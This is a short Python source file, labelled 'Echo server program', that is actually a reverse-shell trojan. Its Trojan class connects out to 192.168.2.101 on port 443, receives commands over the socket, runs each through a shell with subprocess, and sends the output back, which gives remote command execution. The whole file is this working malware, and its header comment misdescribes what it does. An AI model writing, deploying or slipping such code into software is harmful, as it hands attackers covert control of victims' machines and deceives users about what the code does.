# Echo server program
import socket
import subprocess


class Trojan:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port


    def connect(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as con:
            con.connect((self.ip, self.port))
            self.listen(con)

    def execute(self, con):
        data = self.command(con)
        response = self.execute_command(data)
        self.print_message(con, response)

    def listen(self, con):
        while True:
            self.execute(con)



    def command(self,  con):
        return con.recv(1024).decode().strip()

    def execute_command(self, command):
        proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        return proc.stdout.read()

    def print_message(self, con, message):
        con.sendall(message)
if __name__ == "__main__":
    trojan = Trojan("192.168.2.101", 443)
    trojan.connect()
